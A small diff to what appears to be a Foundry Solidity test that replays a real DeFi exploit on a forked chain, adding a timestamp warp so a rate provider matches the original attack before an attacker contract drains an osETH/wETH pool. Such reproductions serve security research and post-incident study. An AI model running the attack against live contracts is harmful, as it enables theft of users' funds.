@@ -40,6 +40,7 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(wstETH).balanceOf(address(beneficiary)), 18);
         emit log_named_decimal_uint("before attack: balance of address(beneficiary)", IERC20(wstETH_wETH).balanceOf(address(beneficiary)), 18);
         // vm.startPrank(attacker, attacker);
+	vm.warp(1762156007); // block 23717397's timestamp, so rate provider returns the same rate as the real attack
         AttackerC attC = new AttackerC();
         attC.attack(osETH_wETH, 67000, 30); // offline computing numbers
         attC.withdraw(osETH_wETH);
